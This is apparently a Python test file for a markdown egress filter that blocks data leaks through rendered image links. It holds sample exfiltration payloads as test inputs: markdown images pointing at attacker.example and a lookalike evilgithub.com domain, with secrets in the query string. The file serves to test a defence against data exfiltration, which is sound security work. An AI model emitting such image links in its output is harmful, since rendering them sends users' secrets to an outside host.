from app.schemas import Boundary, RiskType
from app.security.markdown_egress_policy import MarkdownEgressPolicy


def test_blocks_markdown_image_exfiltration():
    policy = MarkdownEgressPolicy(allowed_hosts={"voxproof.demo"})
    decision = policy.inspect("Done ![](https://attacker.example/leak?d=SECRETEMAILS)")

    assert decision.allowed is False
    assert decision.blocked_urls
    assert decision.findings[0].boundary == Boundary.EGRESS
    assert decision.findings[0].risk == RiskType.DATA_EXFILTRATION


def test_allowed_host_matching_does_not_allow_suffix_trick():
    policy = MarkdownEgressPolicy(allowed_hosts={"github.com"})

    allowed = policy.inspect("![ok](https://docs.github.com/org/repo/img.png)")
    blocked = policy.inspect("![bad](https://evilgithub.com/leak?d=THISISALONGSECRETQUERYVALUE123)")

    assert allowed.allowed is True
    assert blocked.allowed is False


def test_bulk_email_leak_in_plain_text_needs_review():
    policy = MarkdownEgressPolicy()
    decision = policy.inspect("Users: a@example.com, b@example.com, c@example.com")

    assert decision.allowed is False
    assert any("email addresses" in f.evidence for f in decision.findings)
